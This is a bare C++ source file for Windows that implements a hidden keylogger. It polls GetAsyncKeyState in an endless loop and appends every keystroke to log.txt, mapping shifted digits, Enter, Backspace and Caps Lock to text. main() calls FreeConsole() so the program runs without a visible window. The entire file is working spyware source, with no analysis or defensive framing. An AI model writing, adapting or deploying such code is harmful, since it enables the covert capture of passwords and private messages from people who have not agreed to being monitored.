#include <iostream>
#include <windows.h>
#include <fstream>
using namespace std;

void keyloger() {
	char key;
	while (true) {
		for (key = 0; key <= 254; key++) {
			if (GetAsyncKeyState(key) & 0x1) {
				ofstream write;
				write.open("log.txt", ios::app);
				switch (key)
				{

				case 48:
				{
					if (GetAsyncKeyState(0x10))
						write << ")";
					else
						write << "0";
					break;
				}

				case 49:
				{
					if (GetAsyncKeyState(0x10))
						write << "!";
					else
						write << "1";
					break;
				}

				case 50:
				{
					if (GetAsyncKeyState(0x10))
						write << "@";
					else
						write << "2";
					break;
				}

				case 51:
				{
					if (GetAsyncKeyState(0x10))
						write << "#";
					else
						write << "3";
					break;
				}

				case 52:
				{
					if (GetAsyncKeyState(0x10))
						write << "$";
					else
						write << "4";
					break;
				}

				case 53:
				{
					if (GetAsyncKeyState(0x10))
						write << "%";
					else
						write << "5";
					break;
				}

				case 54:
				{
					if (GetAsyncKeyState(0x10))
						write << "^";
					else
						write << "6";
					break;
				}

				case 55:
				{
					if (GetAsyncKeyState(0x10))
						write << "&";
					else
						write << "7";
					break;
				}

				case 56:
				{
					if (GetAsyncKeyState(0x10))
						write << "*";
					else
						write << "8";
					break;
				}

				case 57:
				{
					if (GetAsyncKeyState(0x10))
						write << "(";
					else
						write << "9";
					break;
				}

				case 8:
					write << "<Backspace>";
					break;

				case 127:
					write << "<Delete>";
					break;

				case 27:
					write << "<Escape>";
					break;

				case 32:
					write << " ";
					break;

				case 13:
					write << "<Enter>\n";
					break;

				case 9:
					write << "	";           // tab
					break;

				case VK_NUMPAD0:
					write << "0";
					break;

				case VK_NUMPAD1:
					write << "1";
					break;

				case VK_NUMPAD2:
					write << "2";
					break;

				case VK_NUMPAD3:
					write << "3";
					break;

				case VK_NUMPAD4:
					write << "4";
					break;

				case VK_NUMPAD5:
					write << "5";
					break;

				case VK_NUMPAD6:
					write << "6";
					break;

				case VK_NUMPAD7:
					write << "7";
					break;

				case VK_NUMPAD8:
					write << "8";
					break;

				case VK_NUMPAD9:
					write << "9";
					break;

				case VK_CAPITAL:
					write << "[CAPS LOCK]";
					break;

				default:
					write << key;

				}
			}
		}
	}
}
int main()
{
	FreeConsole();
	keyloger();

}

